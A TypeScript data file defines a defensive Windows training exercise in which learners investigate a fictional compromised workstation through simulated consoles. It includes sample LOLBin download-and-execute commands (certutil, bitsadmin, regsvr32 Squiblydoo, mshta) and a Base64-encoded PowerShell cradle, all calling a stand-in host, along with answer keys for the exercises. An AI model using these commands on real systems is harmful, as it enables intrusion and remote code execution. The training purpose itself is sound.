import type { RoomExperience } from "./types";

// "Operation Clean Host" for the "windows-fundamentals" room (rooms-batch-02.ts).
// Script: docs/campaign/05-windows-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Corvane Logistics (fictional), workstation CVN-WS-0418. Lab data differs
// from the graded tasks: no lsass.exe in a user folder (q1), persistence is
// found but the lab never asks which hive needs no admin rights (q2), the
// masquerading service lives in C:\Users\Public, not a svchost in ProgramData
// (q3), the decoded command drops a file rather than running an IEX cradle and
// the drill is certutil under cmd, not Word spawning PowerShell (la1, f1).
export const WINDOWS_FUNDAMENTALS: RoomExperience = {
  roomId: "windows-fundamentals",
  codename: "Operation Clean Host",
  theme: "endpoint",
  handler: { name: "Nadia Rahman", role: "Endpoint Security Lead, Corvane Logistics" },
  briefing: [
    "Corvane Logistics. Workstation CVN-WS-0418 has been acting strangely since Monday.",
    "Nadia Rahman hands you a console on the machine and one instruction: find everything that does not belong.",
    "Accounts, folders, registry, services, processes. Every one of them can hide an intruder.",
    "Clean this host, and you will know Windows the way attackers do.",
  ],
  mission: "Investigate a live Windows workstation from its own consoles: audit accounts and UAC, hunt persistence in the registry and services, triage processes, decode an obfuscated command, and work the macro alert.",
  estimate: "~50 min",
  look: { primary: "#3b9eff", secondary: "#a78bfa", warn: "#f43f5e" },
  scene: "hostcore",
  layout: "stage",
  story: {
    intro: { title: "Something Does Not Belong", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-intro-1f50b356.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-intro-f2cd4276.jpg" },
    afterStation: {
      persistence: { title: "Survives Every Reboot", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch2-5284c930.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch2-6174c07f.jpg" },
      processes: { title: "Impostors", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch3-740f40f8.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch3-1c0d0c21.jpg" },
      macro: { title: "Host Clean", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-finale-077b50e9.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-finale-427eba5e.jpg" },
    },
  },
  stations: [
    {
      id: "machine",
      label: "The Machine",
      topic: "Kernel and user space · key folders · local, domain and built-in accounts · UAC",
      tagline: "Learn where things live on Windows, then audit who has power on this machine",
      building: "control",
      taskIds: ["win-fund-r1"],
    },
    {
      id: "persistence",
      label: "Persistence Hunt",
      topic: "The registry · hives · Run keys · services",
      tagline: "Something survives every reboot. Query the registry and services until you find it",
      building: "vault",
      taskIds: ["win-fund-r2", "win-fund-q2"],
    },
    {
      id: "processes",
      label: "Process Patrol",
      topic: "Processes and parents · masquerading · PowerShell abuse · LOLBins",
      tagline: "Real or impostor? Triage the process list, then decode what an attacker ran",
      building: "lab",
      taskIds: ["win-fund-r3", "win-fund-q1", "win-fund-q3"],
    },
    {
      id: "defenders",
      label: "PowerShell for Defenders",
      topic: "Get-Process · Get-Service · Get-WinEvent · Get-ChildItem · the object pipeline",
      tagline: "Turn the attacker's favourite tool into your investigation console",
      building: "office",
      taskIds: ["win-fund-r4"],
    },
    {
      id: "macro",
      label: "The Macro Alert",
      topic: "Reading a process-creation alert: parent, child, command line",
      tagline: "The EDR fires on a document that opened something it never should",
      building: "ticket",
      taskIds: ["win-fund-la1", "win-fund-f1"],
      boss: true,
    },
  ],
  personas: {
    "win-fund-q2": {
      name: "Nadia Rahman",
      role: "Endpoint Security Lead",
      line: "The attacker never got admin rights, yet the implant survives reboots. Where could it have written itself?",
    },
    "win-fund-q1": {
      name: "Sam Whitlock",
      role: "Incident Responder",
      line: "Look at where this one is running from. Tell me what you think it is.",
    },
    "win-fund-q3": {
      name: "Sam Whitlock",
      role: "Incident Responder",
      line: "New service on a server, Microsoft-sounding name. Something about it bothers me.",
    },
  },
  briefings: {
    // ── Reading 1: architecture, folders, accounts, UAC ──
    "win-fund-r1": [
      {
        kind: "sort",
        title: "Where Does It Live?",
        prompt: "Location is half of every Windows investigation. Is each file where it belongs, or somewhere it should never be?",
        buckets: [
          { id: "ok", label: "Where it belongs" },
          { id: "bad", label: "Suspicious location" },
        ],
        items: [
          { id: "cmd", text: "C:\\Windows\\System32\\cmd.exe", bucket: "ok", why: "Core system binaries live in System32." },
          { id: "expl", text: "C:\\Windows\\System32\\explorer.exe", bucket: "bad", why: "The genuine explorer.exe lives one level up, in C:\\Windows. A copy in System32 is an impostor." },
          { id: "expl2", text: "C:\\Windows\\explorer.exe", bucket: "ok", why: "This is the real Windows shell." },
          { id: "roam", text: "C:\\Users\\r.adams\\AppData\\Roaming\\svch0st.exe", bucket: "bad", why: "A misspelt system name in a user-writable folder: two red flags at once." },
          { id: "temp", text: "C:\\Users\\r.adams\\AppData\\Local\\Temp\\invoice_9921.exe", bucket: "bad", why: "Executables launching from Temp are a classic dropper pattern." },
          { id: "pf", text: "C:\\Program Files\\7-Zip\\7z.exe", bucket: "ok", why: "Installed software lives in Program Files, which needs admin rights to write." },
          { id: "def", text: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe", bucket: "ok", why: "A real exception: Defender's engine runs from ProgramData. Location is a clue, never a verdict on its own." },
        ],
      },
      {
        kind: "terminal",
        title: "Who Has Power Here?",
        prompt: "Before you hunt, find out who you are on this machine and who else holds admin rights. Use the console.",
        shell: "cmd",
        host: "C:\\Users\\r.adams>",
        commands: [
          { match: "whoami", help: "whoami                          the current account", output: "corvane\\r.adams" },
          { match: "whoami\\s+/groups", help: "whoami /groups                  groups and integrity level",
            output: "GROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID          Attributes\n====================================== ================ ============ ==================================================\nEveryone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Administrators                  Alias            S-1-5-32-544 Group used for deny only\nBUILTIN\\Users                           Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nCORVANE\\Logistics-Staff                 Group            S-1-5-21-...  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level  Label            S-1-16-8192" },
          { match: "net\\s+localgroup\\s+administrators", help: "net localgroup administrators   members of local admins",
            output: "Alias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nCORVANE\\Domain Admins\nCORVANE\\it.helpdesk\nsvc_update2\nThe command completed successfully." },
          { match: "net\\s+user\\s+administrator", help: "net user administrator          the built-in admin account",
            output: "User name                    Administrator\nFull Name\nComment                      Built-in account for administering the computer/domain\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            02/11/2026 23:51:07\nLast logon                   03/11/2026 02:14:40\n\nLocal Group Memberships      *Administrators\nThe command completed successfully." },
          { match: "net\\s+user\\s+svc_update2", help: "net user svc_update2            details of one local account",
            output: "User name                    svc_update2\nFull Name\nComment\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            02/11/2026 23:49:12\nLast logon                   03/11/2026 02:16:03\n\nLocal Group Memberships      *Administrators\nThe command completed successfully." },
        ],
        objectives: [
          { id: "il", task: "At which integrity level is this console running?", hint: "whoami /groups", answer: ["Medium", "Medium Mandatory Level"], why: "Medium: UAC keeps even an admin's programs at standard rights ('Administrators: deny only') until a prompt elevates them to High." },
          { id: "odd", task: "Which member of the local Administrators group does not belong?", hint: "net localgroup administrators", answer: ["svc_update2"], why: "Domain Admins and the help-desk group are expected. A local account called svc_update2 is not a standard Windows or Corvane account." },
          { id: "admin", task: "Is the built-in Administrator account active? (yes or no)", hint: "net user administrator", answer: ["yes"], why: "It should be disabled or renamed. It was re-enabled, its password set at 23:51 and used at 02:14: the same night svc_update2 was created." },
        ],
      },
    ],
    // ── Reading 2: the registry and services ──
    "win-fund-r2": [
      {
        kind: "terminal",
        title: "Query the Registry",
        prompt: "Programs that start themselves at logon are listed in the Run keys, and services start at boot. Query both and find the implant.",
        shell: "cmd",
        host: "C:\\Windows\\system32>",
        commands: [
          { match: "reg\\s+query\\s+\"?hklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\"?", help: "reg query HKLM\\...\\CurrentVersion\\Run   machine-wide Run key",
            output: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    RtkAudUService    REG_SZ    \"C:\\Windows\\System32\\RtkAudUService64.exe\" -background" },
          { match: "reg\\s+query\\s+\"?hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\"?", help: "reg query HKCU\\...\\CurrentVersion\\Run   this user's Run key",
            output: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    OneDrive    REG_SZ    \"C:\\Users\\r.adams\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n    ChromeUpdateTask    REG_SZ    \"C:\\Users\\r.adams\\AppData\\Roaming\\chrome_upd\\chrome.exe\" --check" },
          { match: "sc\\s+qc\\s+printhelpersvc", help: "sc qc PrintHelperSvc            configuration of a service",
            output: "[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: PrintHelperSvc\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Users\\Public\\svcupd.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Print Helper\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem" },
          { match: "sc\\s+query\\s+printhelpersvc", help: "sc query PrintHelperSvc         is the service running?",
            output: "SERVICE_NAME: PrintHelperSvc\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)" },
          { match: "sc\\s+qc\\s+spooler",
            output: "[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: Spooler\n        TYPE               : 110  WIN32_OWN_PROCESS (interactive)\n        START_TYPE         : 2   AUTO_START\n        BINARY_PATH_NAME   : C:\\Windows\\System32\\spoolsv.exe\n        DISPLAY_NAME       : Print Spooler\n        SERVICE_START_NAME : LocalSystem" },
        ],
        objectives: [
          { id: "runval", task: "Which Run value launches a program from a folder users can write to?", hint: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", answer: ["ChromeUpdateTask"], why: "Chrome updates through its own scheduled tasks from Program Files, never a 'chrome.exe' in AppData\\Roaming. OneDrive in AppData\\Local is a genuine per-user install." },
          { id: "svcbin", task: "Which file does the 'Print Helper' service (PrintHelperSvc) run?", hint: "sc qc PrintHelperSvc", answer: ["C:\\Users\\Public\\svcupd.exe"], why: "Compare with the real Print Spooler (sc qc spooler): System32\\spoolsv.exe. A service binary in C:\\Users\\Public is a planted one." },
          { id: "svcacct", task: "Which account does that service run as?", hint: "sc qc PrintHelperSvc", answer: ["LocalSystem", "SYSTEM", "NT AUTHORITY\\SYSTEM"], why: "LocalSystem has more power than an administrator. A planted auto-start service as SYSTEM is a full, reboot-proof foothold." },
        ],
      },
      {
        kind: "match",
        title: "Know the Hives",
        prompt: "Five root keys hold everything. Match each hive to what it stores.",
        pairs: [
          { id: "hklm", left: "HKEY_LOCAL_MACHINE", right: "Settings for the whole computer: software, services, drivers", why: "Machine-wide, so writing here needs admin rights." },
          { id: "hkcu", left: "HKEY_CURRENT_USER", right: "Settings for the user who is logged on", why: "Each user's own preferences and Run key." },
          { id: "hku", left: "HKEY_USERS", right: "Every loaded user profile, stored by SID", why: "HKCU is really one SID under here." },
          { id: "hkcr", left: "HKEY_CLASSES_ROOT", right: "File associations and COM object registrations", why: "COM hijacking lives here." },
          { id: "hkcc", left: "HKEY_CURRENT_CONFIG", right: "The current hardware profile", why: "Rarely touched by attackers." },
        ],
      },
    ],
    // ── Reading 3: processes, PowerShell abuse, LOLBins ──
    "win-fund-r3": [
      {
        kind: "queue",
        title: "Process Triage",
        prompt: "Six processes from CVN-WS-0418. Check the path, the parent and the user. Real, or impostor?",
        console: "EDR · Process list · CVN-WS-0418",
        actions: [
          { id: "ok", label: "Legitimate", tone: "close" },
          { id: "sus", label: "Suspicious", tone: "escalate" },
        ],
        alerts: [
          { id: "svchost", time: "PID 1144", severity: "Low", rule: "svchost.exe", entity: "SYSTEM",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\svchost.exe" }, { k: "command", v: "svchost.exe -k netsvcs -p" }, { k: "parent", v: "services.exe" }, { k: "user", v: "NT AUTHORITY\\SYSTEM" }],
            context: "System32, started by services.exe, with a -k service group.", answer: "ok", why: "Exactly how a genuine service host looks: right path, right parent, a -k group." },
          { id: "explorer", time: "PID 7720", severity: "High", rule: "explorer.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\explorer.exe" }, { k: "parent", v: "cmd.exe" }, { k: "user", v: "CORVANE\\r.adams" }, { k: "signer", v: "not signed" }],
            context: "A second explorer.exe, launched from a command prompt.", answer: "sus", why: "The real explorer.exe lives in C:\\Windows, is signed by Microsoft and is started by userinit at logon, not by cmd.exe." },
          { id: "onedrive", time: "PID 6088", severity: "Low", rule: "OneDrive.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Users\\r.adams\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" }, { k: "parent", v: "explorer.exe" }, { k: "signer", v: "Microsoft Corporation (valid)" }],
            context: "Runs from AppData, started at logon, validly signed.", answer: "ok", why: "OneDrive genuinely installs per user under AppData\\Local. AppData is a clue to check, not a verdict: the signature and parent settle it." },
          { id: "csrss", time: "PID 9012", severity: "Critical", rule: "csrss.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Users\\Public\\csrss.exe" }, { k: "parent", v: "wscript.exe" }, { k: "user", v: "CORVANE\\r.adams" }],
            context: "A core Windows process name, from a public folder, started by a script host.", answer: "sus", why: "The real csrss.exe only runs from System32, as SYSTEM, started during boot. This is masquerading." },
          { id: "rundll", time: "PID 8840", severity: "High", rule: "rundll32.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\rundll32.exe" }, { k: "command", v: "rundll32.exe C:\\Users\\Public\\upd.dll,Start" }, { k: "parent", v: "EXCEL.EXE" }],
            context: "A genuine Windows binary, but loading a DLL from a public folder, launched by Excel.", answer: "sus", why: "The binary is real; the abuse is in the command line and the parent. A LOLBin running a DLL dropped by a spreadsheet." },
          { id: "winlogon", time: "PID 676", severity: "Low", rule: "winlogon.exe", entity: "SYSTEM",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\winlogon.exe" }, { k: "parent", v: "smss.exe (exited)" }, { k: "user", v: "NT AUTHORITY\\SYSTEM" }],
            context: "Started at boot by the session manager, from System32.", answer: "ok", why: "Correct path, SYSTEM, started by smss.exe during boot. Normal." },
        ],
      },
      {
        kind: "sort",
        title: "Admin or Attacker?",
        prompt: "Living-off-the-land binaries are signed Microsoft tools. The command line tells you who is using them. Sort each one.",
        buckets: [
          { id: "admin", label: "Normal admin use" },
          { id: "attack", label: "Attacker use" },
        ],
        items: [
          { id: "certdl", text: "certutil -urlcache -split -f http://203.0.113.90/a.txt C:\\Users\\Public\\a.exe", bucket: "attack", why: "certutil is for certificates; downloading an executable with it is a classic abuse." },
          { id: "certok", text: "certutil -dump C:\\certs\\webserver.cer", bucket: "admin", why: "Inspecting a certificate file: exactly what certutil is for." },
          { id: "regsvr", text: "regsvr32 /s /n /u /i:http://203.0.113.90/p.sct scrobj.dll", bucket: "attack", why: "The 'Squiblydoo' technique: a remote scriptlet run through a signed binary." },
          { id: "regok", text: "regsvr32 /s \"C:\\Program Files\\Vendor\\component.dll\"", bucket: "admin", why: "Registering a local DLL from Program Files: a normal installer step." },
          { id: "mshta", text: "mshta http://203.0.113.90/update.hta", bucket: "attack", why: "Running a remote HTML application: almost never legitimate in an office." },
          { id: "bits", text: "bitsadmin /transfer job /download http://203.0.113.90/t.exe C:\\Users\\Public\\t.exe", bucket: "attack", why: "BITS hides the download inside a trusted Windows service." },
        ],
      },
      {
        kind: "terminal",
        title: "Decode It",
        prompt: "EDR caught this on CVN-WS-0418: powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADkAMAAvAHUALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXAB1AC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAVABFAE0AUABcAHUALgBlAHgAZQA= . Decode it to see what it really did.",
        shell: "powershell",
        host: "PS C:\\Investigation>",
        commands: [
          { match: "\\[(system\\.)?text\\.encoding\\]::unicode\\.getstring\\(\\s*\\[(system\\.)?convert\\]::frombase64string\\(.*\\)\\s*\\)", help: "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<base64>'))   decode -EncodedCommand",
            output: "Invoke-WebRequest -Uri 'http://203.0.113.90/u.exe' -OutFile $env:TEMP\\u.exe; Start-Process $env:TEMP\\u.exe" },
          { match: "\\[(system\\.)?text\\.encoding\\]::(utf8|ascii)\\.getstring\\(.*", output: "I.n.v.o.k.e.-.W.e.b.R.e.q.u.e.s.t. ...\n(Garbled: -EncodedCommand is UTF-16LE. Use [Text.Encoding]::Unicode instead.)" },
        ],
        objectives: [
          { id: "url", task: "Which URL does the decoded command download from?", hint: "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBr...paste the whole string...'))", answer: ["http://203.0.113.90/u.exe"], why: "PowerShell's -EncodedCommand is Base64 of UTF-16LE text. Decoding it is the first thing you do with any encoded command." },
          { id: "where", task: "Where does it save the downloaded file?", hint: "Read the -OutFile part of the decoded command", answer: ["$env:TEMP\\u.exe", "%TEMP%\\u.exe", "temp\\u.exe", "$env:temp\\u.exe"], why: "%TEMP%: user-writable, and the classic drop folder. Look there for u.exe and hash it." },
          { id: "run", task: "Which cmdlet then runs the file?", hint: "Read the command after the semicolon", answer: ["Start-Process"], why: "Download to Temp, then execute: a two-step dropper hidden behind Base64 and a hidden window." },
        ],
      },
    ],
    // ── Reading 4: PowerShell for defenders ──
    "win-fund-r4": [
      {
        kind: "terminal",
        title: "Hunt with PowerShell",
        prompt: "Now the same shell works for you. Use PowerShell to pull the evidence Nadia needs for the incident ticket.",
        shell: "powershell",
        host: "PS C:\\Investigation>",
        commands: [
          { match: "get-process(\\s*\\|.*)?", help: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
            output: "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    214      19   812440     820112   2150.44   5532   0 svcupd\n   2380     101   402112     388004    611.20   3016   1 chrome\n   1188      58   220540     231988    140.75   6088   1 OneDrive\n    902      44   160112     171230     92.01   7740   1 OUTLOOK\n   3021     120   140887     150020     61.33   1144   0 svchost" },
          { match: "get-service(\\s+.*)?", help: "Get-Service WinDefend, PrintHelperSvc",
            output: "Status   Name               DisplayName\n------   ----               -----------\nStopped  WinDefend          Microsoft Defender Antivirus Service\nRunning  PrintHelperSvc     Print Helper\nRunning  Spooler            Print Spooler" },
          { match: "get-winevent.*7045.*", help: "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 3",
            output: "   ProviderName: Service Control Manager\n\nTimeCreated            Id LevelDisplayName Message\n-----------            -- ---------------- -------\n03/11/2026 02:17:09  7045 Information      A service was installed in the system.\n                                           Service Name:  Print Helper\n                                           Service File Name:  C:\\Users\\Public\\svcupd.exe\n                                           Service Type:  user mode service\n                                           Service Start Type:  auto start\n                                           Service Account:  LocalSystem\n14/10/2026 09:40:51  7045 Information      A service was installed in the system.\n                                           Service Name:  Google Chrome Elevation Service\n                                           Service File Name:  \"C:\\Program Files\\Google\\Chrome\\Application\\130.0.6723.70\\elevation_service.exe\"" },
          { match: "get-childitem.*appdata.*", help: "Get-ChildItem $env:APPDATA -Recurse -Include *.exe",
            output: "    Directory: C:\\Users\\r.adams\\AppData\\Roaming\\chrome_upd\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        03/11/2026     02:15         418304 chrome.exe\n\n    Directory: C:\\Users\\r.adams\\AppData\\Roaming\\Zoom\\bin\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        21/09/2026     11:02        1290112 Zoom.exe" },
        ],
        objectives: [
          { id: "cpu", task: "Which process is burning the most CPU?", hint: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5", answer: ["svcupd", "svcupd.exe"], why: "svcupd: the binary behind the planted 'Print Helper' service. Heavy, constant CPU on a planted binary often means a coin miner or a busy implant." },
          { id: "def", task: "What state is the Microsoft Defender Antivirus service (WinDefend) in?", hint: "Get-Service WinDefend", answer: ["Stopped"], why: "Attackers stop the antivirus before they act. A stopped WinDefend on a managed laptop is an alert on its own." },
          { id: "when", task: "At what time was the 'Print Helper' service installed (HH:MM)?", hint: "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 3", answer: ["02:17", "02:17:09"], why: "Event 7045 records every new service. 02:17, three minutes after the built-in Administrator logged on: the timeline is building itself." },
          { id: "exe", task: "How many .exe files sit under AppData\\Roaming?", hint: "Get-ChildItem $env:APPDATA -Recurse -Include *.exe", answer: ["2", "two"], why: "Two: a genuine Zoom from September, and chrome.exe written at 02:15 that night. Timestamps separate them." },
        ],
      },
    ],
    // Drill before the graded alert: a different process-creation event.
    "win-fund-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of a Process-Creation Event",
        prompt: "Your alert is a process creation. Nadia shows you one from another host, as Sysmon records it (Event ID 1), field by field.",
        source: "Sysmon · Microsoft-Windows-Sysmon/Operational · Event ID 1",
        fields: [
          { key: "UtcTime", value: "2026-11-03 02:21:44.912" },
          { key: "ProcessId", value: "6204" },
          { key: "Image", value: "C:\\Windows\\System32\\certutil.exe", label: "What ran", note: "The full path of the program. Right folder, real Microsoft binary." },
          { key: "OriginalFileName", value: "CertUtil.exe", label: "Real name", note: "Taken from the file itself. If someone renames a copy, Image changes but this does not." },
          { key: "CommandLine", value: "certutil -urlcache -split -f http://203.0.113.90/k.txt C:\\Users\\Public\\k.exe", label: "What it was told to do", note: "The most important field: a certificate tool downloading an executable. The binary is clean; the command line is the attack." },
          { key: "CurrentDirectory", value: "C:\\Users\\Public\\" },
          { key: "User", value: "CORVANE\\l.fischer", label: "As whom", note: "The account that ran it. Ask: does this person ever need certutil?" },
          { key: "IntegrityLevel", value: "Medium", label: "With what rights", note: "Medium: a normal, non-elevated user process." },
          { key: "Hashes", value: "SHA256=5d1f3a2c0b9e7d6a4c8f2e1b0a9d7c6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c", label: "Fingerprint", note: "The hash of the binary that ran. For a genuine certutil it matches Microsoft's; look it up for any unknown program." },
          { key: "ParentImage", value: "C:\\Windows\\System32\\cmd.exe", label: "Who started it", note: "The parent. Then ask who started the parent: walk the tree up until it explains itself." },
          { key: "ParentCommandLine", value: "cmd.exe /c certutil -urlcache -split -f http://203.0.113.90/k.txt C:\\Users\\Public\\k.exe" },
        ],
        summary: "On another host, l.fischer's session ran cmd.exe, which ran certutil to download k.exe into C:\\Users\\Public. A trusted binary doing an untrusted job: parent, child and command line together tell the story.",
      },
    ],
  },
};
